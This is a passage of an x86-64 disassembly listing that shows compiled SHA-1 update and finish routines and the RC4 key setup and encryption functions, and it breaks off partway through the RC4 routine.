  4070fa:	89 c0                	mov    %eax,%eax
  4070fc:	48 c1 e8 1f          	shr    $0x1f,%rax
  407100:	48 09 c8             	or     %rcx,%rax
  407103:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  407107:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40710b:	48 01 c2             	add    %rax,%rdx
  40710e:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  407115:	48 01 c2             	add    %rax,%rdx
  407118:	b8 d6 c1 62 ca       	mov    $0xca62c1d6,%eax
  40711d:	48 01 d0             	add    %rdx,%rax
  407120:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  407127:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  40712e:	48 c1 e0 1e          	shl    $0x1e,%rax
  407132:	48 89 c2             	mov    %rax,%rdx
  407135:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  40713c:	89 c0                	mov    %eax,%eax
  40713e:	48 c1 e8 02          	shr    $0x2,%rax
  407142:	48 09 d0             	or     %rdx,%rax
  407145:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  40714c:	48 8b 85 48 ff ff ff 	mov    -0xb8(%rbp),%rax
  407153:	48 8b 50 10          	mov    0x10(%rax),%rdx
  407157:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  40715e:	48 01 c2             	add    %rax,%rdx
  407161:	48 8b 85 48 ff ff ff 	mov    -0xb8(%rbp),%rax
  407168:	48 89 50 10          	mov    %rdx,0x10(%rax)
  40716c:	48 8b 85 48 ff ff ff 	mov    -0xb8(%rbp),%rax
  407173:	48 8b 50 18          	mov    0x18(%rax),%rdx
  407177:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  40717e:	48 01 c2             	add    %rax,%rdx
  407181:	48 8b 85 48 ff ff ff 	mov    -0xb8(%rbp),%rax
  407188:	48 89 50 18          	mov    %rdx,0x18(%rax)
  40718c:	48 8b 85 48 ff ff ff 	mov    -0xb8(%rbp),%rax
  407193:	48 8b 50 20          	mov    0x20(%rax),%rdx
  407197:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  40719e:	48 01 c2             	add    %rax,%rdx
  4071a1:	48 8b 85 48 ff ff ff 	mov    -0xb8(%rbp),%rax
  4071a8:	48 89 50 20          	mov    %rdx,0x20(%rax)
  4071ac:	48 8b 85 48 ff ff ff 	mov    -0xb8(%rbp),%rax
  4071b3:	48 8b 50 28          	mov    0x28(%rax),%rdx
  4071b7:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4071be:	48 01 c2             	add    %rax,%rdx
  4071c1:	48 8b 85 48 ff ff ff 	mov    -0xb8(%rbp),%rax
  4071c8:	48 89 50 28          	mov    %rdx,0x28(%rax)
  4071cc:	48 8b 85 48 ff ff ff 	mov    -0xb8(%rbp),%rax
  4071d3:	48 8b 50 30          	mov    0x30(%rax),%rdx
  4071d7:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4071de:	48 01 c2             	add    %rax,%rdx
  4071e1:	48 8b 85 48 ff ff ff 	mov    -0xb8(%rbp),%rax
  4071e8:	48 89 50 30          	mov    %rdx,0x30(%rax)
  4071ec:	c9                   	leaveq 
  4071ed:	c3                   	retq   

00000000004071ee <sha1_update>:
  4071ee:	55                   	push   %rbp
  4071ef:	48 89 e5             	mov    %rsp,%rbp
  4071f2:	48 83 ec 30          	sub    $0x30,%rsp
  4071f6:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
  4071fa:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
  4071fe:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
  407202:	48 83 7d d8 00       	cmpq   $0x0,-0x28(%rbp)
  407207:	75 05                	jne    40720e <sha1_update+0x20>
  407209:	e9 1c 01 00 00       	jmpq   40732a <sha1_update+0x13c>
  40720e:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  407212:	48 8b 00             	mov    (%rax),%rax
  407215:	83 e0 3f             	and    $0x3f,%eax
  407218:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  40721c:	b8 40 00 00 00       	mov    $0x40,%eax
  407221:	48 2b 45 f0          	sub    -0x10(%rbp),%rax
  407225:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  407229:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  40722d:	48 8b 10             	mov    (%rax),%rdx
  407230:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  407234:	48 01 c2             	add    %rax,%rdx
  407237:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  40723b:	48 89 10             	mov    %rdx,(%rax)
  40723e:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  407242:	48 8b 00             	mov    (%rax),%rax
  407245:	89 c2                	mov    %eax,%edx
  407247:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  40724b:	48 89 10             	mov    %rdx,(%rax)
  40724e:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  407252:	48 8b 00             	mov    (%rax),%rax
  407255:	48 3b 45 d8          	cmp    -0x28(%rbp),%rax
  407259:	73 14                	jae    40726f <sha1_update+0x81>
  40725b:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  40725f:	48 8b 40 08          	mov    0x8(%rax),%rax
  407263:	48 8d 50 01          	lea    0x1(%rax),%rdx
  407267:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  40726b:	48 89 50 08          	mov    %rdx,0x8(%rax)
  40726f:	48 83 7d f0 00       	cmpq   $0x0,-0x10(%rbp)
  407274:	74 61                	je     4072d7 <sha1_update+0xe9>
  407276:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  40727a:	48 3b 45 f8          	cmp    -0x8(%rbp),%rax
  40727e:	72 57                	jb     4072d7 <sha1_update+0xe9>
  407280:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  407284:	48 8d 50 30          	lea    0x30(%rax),%rdx
  407288:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  40728c:	48 01 d0             	add    %rdx,%rax
  40728f:	48 8d 48 08          	lea    0x8(%rax),%rcx
  407293:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
  407297:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  40729b:	48 89 c6             	mov    %rax,%rsi
  40729e:	48 89 cf             	mov    %rcx,%rdi
  4072a1:	e8 ba 9c ff ff       	callq  400f60 <memcpy@plt>
  4072a6:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  4072aa:	48 8d 50 38          	lea    0x38(%rax),%rdx
  4072ae:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  4072b2:	48 89 d6             	mov    %rdx,%rsi
  4072b5:	48 89 c7             	mov    %rax,%rdi
  4072b8:	e8 bb bd ff ff       	callq  403078 <sha1_process>
  4072bd:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4072c1:	48 29 45 d8          	sub    %rax,-0x28(%rbp)
  4072c5:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4072c9:	48 01 45 e0          	add    %rax,-0x20(%rbp)
  4072cd:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
  4072d4:	00 
  4072d5:	eb 1f                	jmp    4072f6 <sha1_update+0x108>
  4072d7:	eb 1d                	jmp    4072f6 <sha1_update+0x108>
  4072d9:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
  4072dd:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  4072e1:	48 89 d6             	mov    %rdx,%rsi
  4072e4:	48 89 c7             	mov    %rax,%rdi
  4072e7:	e8 8c bd ff ff       	callq  403078 <sha1_process>
  4072ec:	48 83 6d d8 40       	subq   $0x40,-0x28(%rbp)
  4072f1:	48 83 45 e0 40       	addq   $0x40,-0x20(%rbp)
  4072f6:	48 83 7d d8 3f       	cmpq   $0x3f,-0x28(%rbp)
  4072fb:	77 dc                	ja     4072d9 <sha1_update+0xeb>
  4072fd:	48 83 7d d8 00       	cmpq   $0x0,-0x28(%rbp)
  407302:	74 26                	je     40732a <sha1_update+0x13c>
  407304:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  407308:	48 8d 50 30          	lea    0x30(%rax),%rdx
  40730c:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  407310:	48 01 d0             	add    %rdx,%rax
  407313:	48 8d 48 08          	lea    0x8(%rax),%rcx
  407317:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
  40731b:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  40731f:	48 89 c6             	mov    %rax,%rsi
  407322:	48 89 cf             	mov    %rcx,%rdi
  407325:	e8 36 9c ff ff       	callq  400f60 <memcpy@plt>
  40732a:	c9                   	leaveq 
  40732b:	c3                   	retq   

000000000040732c <sha1_finish>:
  40732c:	55                   	push   %rbp
  40732d:	48 89 e5             	mov    %rsp,%rbp
  407330:	48 83 ec 40          	sub    $0x40,%rsp
  407334:	48 89 7d c8          	mov    %rdi,-0x38(%rbp)
  407338:	48 89 75 c0          	mov    %rsi,-0x40(%rbp)
  40733c:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  407343:	00 00 
  407345:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  407349:	31 c0                	xor    %eax,%eax
  40734b:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  40734f:	48 8b 00             	mov    (%rax),%rax
  407352:	48 c1 e8 1d          	shr    $0x1d,%rax
  407356:	48 89 c2             	mov    %rax,%rdx
  407359:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  40735d:	48 8b 40 08          	mov    0x8(%rax),%rax
  407361:	48 c1 e0 03          	shl    $0x3,%rax
  407365:	48 09 d0             	or     %rdx,%rax
  407368:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
  40736c:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  407370:	48 8b 00             	mov    (%rax),%rax
  407373:	48 c1 e0 03          	shl    $0x3,%rax
  407377:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
  40737b:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  40737f:	48 c1 e8 18          	shr    $0x18,%rax
  407383:	88 45 f0             	mov    %al,-0x10(%rbp)
  407386:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  40738a:	48 c1 e8 10          	shr    $0x10,%rax
  40738e:	88 45 f1             	mov    %al,-0xf(%rbp)
  407391:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  407395:	48 c1 e8 08          	shr    $0x8,%rax
  407399:	88 45 f2             	mov    %al,-0xe(%rbp)
  40739c:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  4073a0:	88 45 f3             	mov    %al,-0xd(%rbp)
  4073a3:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  4073a7:	48 c1 e8 18          	shr    $0x18,%rax
  4073ab:	88 45 f4             	mov    %al,-0xc(%rbp)
  4073ae:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  4073b2:	48 c1 e8 10          	shr    $0x10,%rax
  4073b6:	88 45 f5             	mov    %al,-0xb(%rbp)
  4073b9:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  4073bd:	48 c1 e8 08          	shr    $0x8,%rax
  4073c1:	88 45 f6             	mov    %al,-0xa(%rbp)
  4073c4:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  4073c8:	88 45 f7             	mov    %al,-0x9(%rbp)
  4073cb:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  4073cf:	48 8b 00             	mov    (%rax),%rax
  4073d2:	83 e0 3f             	and    $0x3f,%eax
  4073d5:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
  4073d9:	48 83 7d e0 37       	cmpq   $0x37,-0x20(%rbp)
  4073de:	77 0b                	ja     4073eb <sha1_finish+0xbf>
  4073e0:	b8 38 00 00 00       	mov    $0x38,%eax
  4073e5:	48 2b 45 e0          	sub    -0x20(%rbp),%rax
  4073e9:	eb 09                	jmp    4073f4 <sha1_finish+0xc8>
  4073eb:	b8 78 00 00 00       	mov    $0x78,%eax
  4073f0:	48 2b 45 e0          	sub    -0x20(%rbp),%rax
  4073f4:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  4073f8:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
  4073fc:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  407400:	be a0 91 60 00       	mov    $0x6091a0,%esi
  407405:	48 89 c7             	mov    %rax,%rdi
  407408:	e8 e1 fd ff ff       	callq  4071ee <sha1_update>
  40740d:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
  407411:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  407415:	ba 08 00 00 00       	mov    $0x8,%edx
  40741a:	48 89 ce             	mov    %rcx,%rsi
  40741d:	48 89 c7             	mov    %rax,%rdi
  407420:	e8 c9 fd ff ff       	callq  4071ee <sha1_update>
  407425:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  407429:	48 8b 40 10          	mov    0x10(%rax),%rax
  40742d:	48 c1 e8 18          	shr    $0x18,%rax
  407431:	89 c2                	mov    %eax,%edx
  407433:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  407437:	88 10                	mov    %dl,(%rax)
  407439:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  40743d:	48 8d 50 01          	lea    0x1(%rax),%rdx
  407441:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  407445:	48 8b 40 10          	mov    0x10(%rax),%rax
  407449:	48 c1 e8 10          	shr    $0x10,%rax
  40744d:	88 02                	mov    %al,(%rdx)
  40744f:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  407453:	48 8d 50 02          	lea    0x2(%rax),%rdx
  407457:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  40745b:	48 8b 40 10          	mov    0x10(%rax),%rax
  40745f:	48 c1 e8 08          	shr    $0x8,%rax
  407463:	88 02                	mov    %al,(%rdx)
  407465:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  407469:	48 8d 50 03          	lea    0x3(%rax),%rdx
  40746d:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  407471:	48 8b 40 10          	mov    0x10(%rax),%rax
  407475:	88 02                	mov    %al,(%rdx)
  407477:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  40747b:	48 8d 50 04          	lea    0x4(%rax),%rdx
  40747f:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  407483:	48 8b 40 18          	mov    0x18(%rax),%rax
  407487:	48 c1 e8 18          	shr    $0x18,%rax
  40748b:	88 02                	mov    %al,(%rdx)
  40748d:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  407491:	48 8d 50 05          	lea    0x5(%rax),%rdx
  407495:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  407499:	48 8b 40 18          	mov    0x18(%rax),%rax
  40749d:	48 c1 e8 10          	shr    $0x10,%rax
  4074a1:	88 02                	mov    %al,(%rdx)
  4074a3:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  4074a7:	48 8d 50 06          	lea    0x6(%rax),%rdx
  4074ab:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  4074af:	48 8b 40 18          	mov    0x18(%rax),%rax
  4074b3:	48 c1 e8 08          	shr    $0x8,%rax
  4074b7:	88 02                	mov    %al,(%rdx)
  4074b9:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  4074bd:	48 8d 50 07          	lea    0x7(%rax),%rdx
  4074c1:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  4074c5:	48 8b 40 18          	mov    0x18(%rax),%rax
  4074c9:	88 02                	mov    %al,(%rdx)
  4074cb:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  4074cf:	48 8d 50 08          	lea    0x8(%rax),%rdx
  4074d3:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  4074d7:	48 8b 40 20          	mov    0x20(%rax),%rax
  4074db:	48 c1 e8 18          	shr    $0x18,%rax
  4074df:	88 02                	mov    %al,(%rdx)
  4074e1:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  4074e5:	48 8d 50 09          	lea    0x9(%rax),%rdx
  4074e9:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  4074ed:	48 8b 40 20          	mov    0x20(%rax),%rax
  4074f1:	48 c1 e8 10          	shr    $0x10,%rax
  4074f5:	88 02                	mov    %al,(%rdx)
  4074f7:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  4074fb:	48 8d 50 0a          	lea    0xa(%rax),%rdx
  4074ff:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  407503:	48 8b 40 20          	mov    0x20(%rax),%rax
  407507:	48 c1 e8 08          	shr    $0x8,%rax
  40750b:	88 02                	mov    %al,(%rdx)
  40750d:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  407511:	48 8d 50 0b          	lea    0xb(%rax),%rdx
  407515:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  407519:	48 8b 40 20          	mov    0x20(%rax),%rax
  40751d:	88 02                	mov    %al,(%rdx)
  40751f:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  407523:	48 8d 50 0c          	lea    0xc(%rax),%rdx
  407527:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  40752b:	48 8b 40 28          	mov    0x28(%rax),%rax
  40752f:	48 c1 e8 18          	shr    $0x18,%rax
  407533:	88 02                	mov    %al,(%rdx)
  407535:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  407539:	48 8d 50 0d          	lea    0xd(%rax),%rdx
  40753d:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  407541:	48 8b 40 28          	mov    0x28(%rax),%rax
  407545:	48 c1 e8 10          	shr    $0x10,%rax
  407549:	88 02                	mov    %al,(%rdx)
  40754b:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  40754f:	48 8d 50 0e          	lea    0xe(%rax),%rdx
  407553:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  407557:	48 8b 40 28          	mov    0x28(%rax),%rax
  40755b:	48 c1 e8 08          	shr    $0x8,%rax
  40755f:	88 02                	mov    %al,(%rdx)
  407561:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  407565:	48 8d 50 0f          	lea    0xf(%rax),%rdx
  407569:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  40756d:	48 8b 40 28          	mov    0x28(%rax),%rax
  407571:	88 02                	mov    %al,(%rdx)
  407573:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  407577:	48 8d 50 10          	lea    0x10(%rax),%rdx
  40757b:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  40757f:	48 8b 40 30          	mov    0x30(%rax),%rax
  407583:	48 c1 e8 18          	shr    $0x18,%rax
  407587:	88 02                	mov    %al,(%rdx)
  407589:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  40758d:	48 8d 50 11          	lea    0x11(%rax),%rdx
  407591:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  407595:	48 8b 40 30          	mov    0x30(%rax),%rax
  407599:	48 c1 e8 10          	shr    $0x10,%rax
  40759d:	88 02                	mov    %al,(%rdx)
  40759f:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  4075a3:	48 8d 50 12          	lea    0x12(%rax),%rdx
  4075a7:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  4075ab:	48 8b 40 30          	mov    0x30(%rax),%rax
  4075af:	48 c1 e8 08          	shr    $0x8,%rax
  4075b3:	88 02                	mov    %al,(%rdx)
  4075b5:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  4075b9:	48 8d 50 13          	lea    0x13(%rax),%rdx
  4075bd:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  4075c1:	48 8b 40 30          	mov    0x30(%rax),%rax
  4075c5:	88 02                	mov    %al,(%rdx)
  4075c7:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4075cb:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
  4075d2:	00 00 
  4075d4:	74 05                	je     4075db <sha1_finish+0x2af>
  4075d6:	e8 55 98 ff ff       	callq  400e30 <__stack_chk_fail@plt>
  4075db:	c9                   	leaveq 
  4075dc:	c3                   	retq   

00000000004075dd <rc4_setup>:
  4075dd:	55                   	push   %rbp
  4075de:	48 89 e5             	mov    %rsp,%rbp
  4075e1:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
  4075e5:	48 89 75 d0          	mov    %rsi,-0x30(%rbp)
  4075e9:	89 55 cc             	mov    %edx,-0x34(%rbp)
  4075ec:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  4075f0:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
  4075f6:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  4075fa:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%rax)
  407601:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  407605:	48 83 c0 08          	add    $0x8,%rax
  407609:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  40760d:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
  407614:	eb 1d                	jmp    407633 <rc4_setup+0x56>
  407616:	8b 45 e8             	mov    -0x18(%rbp),%eax
  407619:	48 98                	cltq   
  40761b:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
  407622:	00 
  407623:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  407627:	48 01 c2             	add    %rax,%rdx
  40762a:	8b 45 e8             	mov    -0x18(%rbp),%eax
  40762d:	89 02                	mov    %eax,(%rdx)
  40762f:	83 45 e8 01          	addl   $0x1,-0x18(%rbp)
  407633:	81 7d e8 ff 00 00 00 	cmpl   $0xff,-0x18(%rbp)
  40763a:	7e da                	jle    407616 <rc4_setup+0x39>
  40763c:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%rbp)
  407643:	8b 45 f0             	mov    -0x10(%rbp),%eax
  407646:	89 45 ec             	mov    %eax,-0x14(%rbp)
  407649:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
  407650:	e9 98 00 00 00       	jmpq   4076ed <rc4_setup+0x110>
  407655:	8b 45 e8             	mov    -0x18(%rbp),%eax
  407658:	48 98                	cltq   
  40765a:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
  407661:	00 
  407662:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  407666:	48 01 d0             	add    %rdx,%rax
  407669:	8b 00                	mov    (%rax),%eax
  40766b:	89 45 f4             	mov    %eax,-0xc(%rbp)
  40766e:	8b 45 ec             	mov    -0x14(%rbp),%eax
  407671:	89 c2                	mov    %eax,%edx
  407673:	8b 45 f4             	mov    -0xc(%rbp),%eax
  407676:	8d 0c 02             	lea    (%rdx,%rax,1),%ecx
  407679:	8b 45 f0             	mov    -0x10(%rbp),%eax
  40767c:	48 63 d0             	movslq %eax,%rdx
  40767f:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  407683:	48 01 d0             	add    %rdx,%rax
  407686:	0f b6 00             	movzbl (%rax),%eax
  407689:	01 c8                	add    %ecx,%eax
  40768b:	0f b6 c0             	movzbl %al,%eax
  40768e:	89 45 ec             	mov    %eax,-0x14(%rbp)
  407691:	8b 45 e8             	mov    -0x18(%rbp),%eax
  407694:	48 98                	cltq   
  407696:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
  40769d:	00 
  40769e:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4076a2:	48 01 c2             	add    %rax,%rdx
  4076a5:	8b 45 ec             	mov    -0x14(%rbp),%eax
  4076a8:	48 98                	cltq   
  4076aa:	48 8d 0c 85 00 00 00 	lea    0x0(,%rax,4),%rcx
  4076b1:	00 
  4076b2:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4076b6:	48 01 c8             	add    %rcx,%rax
  4076b9:	8b 00                	mov    (%rax),%eax
  4076bb:	89 02                	mov    %eax,(%rdx)
  4076bd:	8b 45 ec             	mov    -0x14(%rbp),%eax
  4076c0:	48 98                	cltq   
  4076c2:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
  4076c9:	00 
  4076ca:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4076ce:	48 01 c2             	add    %rax,%rdx
  4076d1:	8b 45 f4             	mov    -0xc(%rbp),%eax
  4076d4:	89 02                	mov    %eax,(%rdx)
  4076d6:	83 45 f0 01          	addl   $0x1,-0x10(%rbp)
  4076da:	8b 45 f0             	mov    -0x10(%rbp),%eax
  4076dd:	3b 45 cc             	cmp    -0x34(%rbp),%eax
  4076e0:	7c 07                	jl     4076e9 <rc4_setup+0x10c>
  4076e2:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%rbp)
  4076e9:	83 45 e8 01          	addl   $0x1,-0x18(%rbp)
  4076ed:	81 7d e8 ff 00 00 00 	cmpl   $0xff,-0x18(%rbp)
  4076f4:	0f 8e 5b ff ff ff    	jle    407655 <rc4_setup+0x78>
  4076fa:	5d                   	pop    %rbp
  4076fb:	c3                   	retq   

00000000004076fc <rc4_crypt>:
  4076fc:	55                   	push   %rbp
  4076fd:	48 89 e5             	mov    %rsp,%rbp
  407700:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
  407704:	48 89 75 d0          	mov    %rsi,-0x30(%rbp)
  407708:	89 55 cc             	mov    %edx,-0x34(%rbp)
  40770b:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  40770f:	8b 00                	mov    (%rax),%eax
  407711:	89 45 e8             	mov    %eax,-0x18(%rbp)
  407714:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  407718:	8b 40 04             	mov    0x4(%rax),%eax
  40771b:	89 45 ec             	mov    %eax,-0x14(%rbp)
  40771e:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  407722:	48 83 c0 08          	add    $0x8,%rax
  407726:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  40772a:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%rbp)
  407731:	e9 c5 00 00 00       	jmpq   4077fb <rc4_crypt+0xff>
  407736:	8b 45 e8             	mov    -0x18(%rbp),%eax
  407739:	83 c0 01             	add    $0x1,%eax
  40773c:	0f b6 c0             	movzbl %al,%eax
  40773f:	89 45 e8             	mov    %eax,-0x18(%rbp)
  407742:	8b 45 e8             	mov    -0x18(%rbp),%eax
  407745:	48 98                	cltq   
  407747:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
  40774e:	00 
  40774f:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  407753:	48 01 d0             	add    %rdx,%rax
  407756:	8b 00                	mov    (%rax),%eax
  407758:	89 45 f0             	mov    %eax,-0x10(%rbp)
  40775b:	8b 45 ec             	mov    -0x14(%rbp),%eax
  40775e:	89 c2                	mov    %eax,%edx
  407760:	8b 45 f0             	mov    -0x10(%rbp),%eax
  407763:	01 d0                	add    %edx,%eax
  407765:	0f b6 c0             	movzbl %al,%eax
  407768:	89 45 ec             	mov    %eax,-0x14(%rbp)
  40776b:	8b 45 e8             	mov    -0x18(%rbp),%eax
  40776e:	48 98                	cltq   
  407770:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
  407777:	00 
  407778:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  40777c:	48 01 c2             	add    %rax,%rdx
  40777f:	8b 45 ec             	mov    -0x14(%rbp),%eax
  407782:	48 98                	cltq   
  407784:	48 8d 0c 85 00 00 00 	lea    0x0(,%rax,4),%rcx
  40778b:	00 
  40778c:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  407790:	48 01 c8             	add    %rcx,%rax
  407793:	8b 00                	mov    (%rax),%eax
  407795:	89 45 f4             	mov    %eax,-0xc(%rbp)
  407798:	8b 45 f4             	mov    -0xc(%rbp),%eax
  40779b:	89 02                	mov    %eax,(%rdx)
  40779d:	8b 45 ec             	mov    -0x14(%rbp),%eax
  4077a0:	48 98                	cltq   
  4077a2:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
  4077a9:	00 
  4077aa:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4077ae:	48 01 c2             	add    %rax,%rdx
  4077b1:	8b 45 f0             	mov    -0x10(%rbp),%eax
  4077b4:	89 02                	mov    %eax,(%rdx)
  4077b6:	8b 45 e4             	mov    -0x1c(%rbp),%eax
  4077b9:	48 63 d0             	movslq %eax,%rdx
  4077bc:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  4077c0:	48 01 c2             	add    %rax,%rdx
  4077c3:	8b 45 e4             	mov    -0x1c(%rbp),%eax
  4077c6:	48 63 c8             	movslq %eax,%rcx
  4077c9:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  4077cd:	48 01 c8             	add    %rcx,%rax
  4077d0:	0f b6 00             	movzbl (%rax),%eax
  4077d3:	89 c1                	mov    %eax,%ecx
  4077d5:	8b 45 f0             	mov    -0x10(%rbp),%eax
  4077d8:	89 c6                	mov    %eax,%esi
  4077da:	8b 45 f4             	mov    -0xc(%rbp),%eax
  4077dd:	01 f0                	add    %esi,%eax
  4077df:	0f b6 c0             	movzbl %al,%eax
  4077e2:	48 8d 34 85 00 00 00 	lea    0x0(,%rax,4),%rsi
  4077e9:	00 
  4077ea:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4077ee:	48 01 f0             	add    %rsi,%rax
  4077f1:	8b 00                	mov    (%rax),%eax
  4077f3:	31 c8                	xor    %ecx,%eax
  4077f5:	88 02                	mov    %al,(%rdx)
